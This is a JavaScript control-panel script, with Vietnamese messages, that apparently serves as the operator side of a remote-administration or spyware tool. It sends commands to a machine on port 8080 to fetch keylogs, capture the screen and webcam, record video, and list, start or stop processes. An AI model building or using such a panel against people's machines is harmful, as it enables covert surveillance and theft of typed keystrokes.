let IP = "";            

function showToast(text, type = "success"){
    const cont = document.getElementById("toast-container");
    const t = document.createElement("div");
    t.className = "toast " + (type === "success" ? "" : "error");
    t.innerHTML = (type === "success" ? '✅ ' : '❌ ') + text;
    cont.appendChild(t);
    setTimeout(()=> { t.remove(); }, 4000);
}

async function postControl(payload){
    if(!IP) throw new Error("not-connected");
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), 15000); // 15s timeout cho video

    try {
        const res = await fetch(`http://${IP}:8080/control`, {
            method: "POST",
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(id);
        return res.text();
    } catch (error) {
        clearTimeout(id);
        throw error;
    }
}

document.getElementById('btnConnect').addEventListener('click', async ()=>{
    const ip = document.getElementById('ipInput').value.trim();
    if(!ip) { showToast("Nhập IP đi bạn!", "error"); return; }
    try {
        const res = await fetch(`http://${ip}:8080/ping`);
        if(res.ok) {
            IP = ip;
            document.getElementById('connectStatus').innerHTML = `Connected: ${IP}`;
            document.getElementById('connectStatus').style.color = "#34d399";
            document.getElementById('btnConnect').style.display = 'none';
            document.getElementById('btnDisconnect').style.display = 'inline-block';
            showToast("Kết nối thành công!");
        }
    } catch(e){ showToast("Lỗi kết nối!", "error"); }
});

document.getElementById('btnDisconnect').addEventListener('click', ()=>{
    IP = "";
    document.getElementById('connectStatus').innerHTML = "Disconnected";
    document.getElementById('connectStatus').style.color = "#94a3b8";
    document.getElementById('btnConnect').style.display = 'inline-block';
    document.getElementById('btnDisconnect').style.display = 'none';
});

window.sendCommand = async function(cmd){
    if(!IP) { showToast("Chưa kết nối!", "error"); return; }
    
    if(cmd === 'recordVideo') {
        const sec = document.getElementById('recSeconds').value;
        showToast(`🎥 Đang quay ${sec}s (Module riêng)...`, "warning");
        
        // 1. Gửi lệnh
        const path = await postControl({command:'recordVideo', seconds: sec});
        
        if(path.includes("Loi") || path.includes("Error")) {
            showToast(path, "error");
            document.getElementById('recordResult').innerHTML = `<div style="color:red">${path}</div>`;
        } else {
            // 2. Tạo URL (Thêm timestamp để không cache video cũ)
            const timestamp = new Date().getTime();
            const fullUrl = `http://${IP}:8080${path}?t=${timestamp}`;
            
            // 3. Tạo tên file khi tải về
            const downloadName = `Evidence_Video_${timestamp}.mp4`;

            // 4. HIỆN VIDEO PLAYER & NÚT SAVE AS
            document.getElementById('recordResult').innerHTML = `
                <div style="background:#1e293b; padding:15px; border-radius:8px; margin-top:10px; border: 1px solid #475569;">
                    <div style="color:#4ade80; margin-bottom:10px; font-weight:bold;">
                        ✅ Quay xong! (Định dạng MP4)
                    </div>
                    
                    <video controls autoplay width="100%" style="border-radius:5px; border:1px solid #334155; max-height: 300px;">
                        <source src="${fullUrl}" type="video/mp4">
                        Trình duyệt không hỗ trợ thẻ video.
                    </video>

                    <div style="margin-top: 15px; text-align: center;">
                        <a href="${fullUrl}" download="${downloadName}">
                            <button class="action-btn" style="background:#2563eb; width: 100%; padding: 10px;">
                                <i class="fa-solid fa-floppy-disk"></i> LƯU VIDEO VỀ MÁY
                            </button>
                        </a>
                        <div style="font-size: 0.8em; color: #94a3b8; margin-top: 5px;">
                            (Chọn thư mục lưu trong cửa sổ bật lên)
                        </div>
                    </div>
                </div>`;
            showToast("Đã xong! Bạn có thể xem hoặc lưu video.");
        }
        return;
    }
    if(cmd === 'screenshot') {
        const path = await postControl({command:'screenshot'});
        const fullUrl = `http://${IP}:8080${path}?t=${new Date().getTime()}`;
        document.getElementById('screenshotResult').innerHTML = `<img src="${fullUrl}" style="width:100%; border-radius:8px;">`;
        return;
    }

    let payload = {command: cmd};
    if(cmd === 'startApp' || cmd === 'stopProcess') {
        const val = (cmd==='startApp') ? document.getElementById('appName').value : document.getElementById('processName').value;
        payload.name = val;
    }
    const res = await postControl(payload);
    
    if(cmd === 'listApp') document.getElementById('appList').innerText = res;
    else if(cmd === 'listProcess') document.getElementById('processList').innerText = res;
    else if(cmd === 'getKeylog') document.getElementById('keylogResult').innerText = res;
    else showToast(res);
};

function startOnWebcam(){
    if(IP) document.getElementById('onWebcamContainer').innerHTML = `<img src="http://${IP}:8080/camera?t=${Date.now()}" style="width:100%">`;
}
function stopOnWebcam(){
    document.getElementById('onWebcamContainer').innerHTML = "Camera Off";
}